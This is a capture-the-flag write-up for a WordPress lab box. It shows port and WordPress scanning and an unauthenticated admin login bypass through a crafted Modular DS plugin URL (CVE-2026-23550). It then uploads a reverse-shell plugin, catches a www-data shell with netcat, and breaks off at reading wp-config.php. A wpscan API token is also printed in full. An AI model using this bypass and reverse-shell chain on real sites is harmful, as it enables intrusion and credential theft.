---
title: Dark HS Write-Up
machine_ip: 10.1.211.7
os: Linux
difficulty: Easy
my_rating:
tags:
  - writeup
references: "[[📚CTF Box Writeups]]"
date: 2026-07-21
---
## 🌐 Enumeration

```bash
❯ nmap -sSCV -p- --open 10.1.211.7  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 14:06 -0700
Nmap scan report for 10.1.211.7
Host is up (0.091s latency).
Not shown: 65152 closed tcp ports (reset), 381 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:fa:00:85:4c:0d:97:79:7b:46:e4:86:1b:18:72:19 (ECDSA)
|_  256 ea:8d:af:2f:ec:15:d9:32:c0:94:6f:09:03:49:60:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.0
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Dark &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.20 seconds
```

`http-robots.txt` reveals:
```bash
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://dark.hs/wp-sitemap.xml
```

Run `wpscan` with API (free with wpscan.com account):
```bash
❯ wpscan --url http://dark.hs --api-token dqeT6ud4Q0rwFa4vmtStA3DnzfMe0YPkf7AUWePDiNY
```

`Modular DS < 2.5.2 - Unauthenticated Privilege Escalation`
## 🗝️ Initial Access

CVE-2026-23550 - unauthenticated authentication bypass. All you need is the URL:
https://hurayraiit.com/blog/cve-2026-23550-critical-privilege-escalation-in-wordpress-modular-ds-plugin-cvss-10/
~~Step 01: In your WordPress installation, installed and activate the plugin version 2.5.1~~
~~Step 02: Connect your site to their management portal (https://app.modulards.com/)~~
Step 03: As an unauthenticated user, simply visit this URL: https://example.com/api/modular-connector/login/anything?origin=mo&type=foo and you will be automatically logged in as an admin.

Navigate to: `http://dark.hs/api/modular-connector/login/anything?origin=mo&type=foo`
This logs us into the `wp-admin` dashboard!

Let's add a new plugin to get a reverse shell: https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin. Use `v1.4.0`

After the plugin is uploaded and installed, navigate to the dashboard, activate the `Reverse Shell` plugin and Click on `Reverse Shell` on left panel. 

Catch reverse shell as `www-data`
```bash
rlwrap -cAr nc -lnvp 6767
listening on [any] 6767 ...
connect to [10.200.73.71] from (UNKNOWN) [10.1.211.7] 50450
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),121(docker)
```
## ⚡ Privilege Escalation

```bash
cat ../wp-config.php
```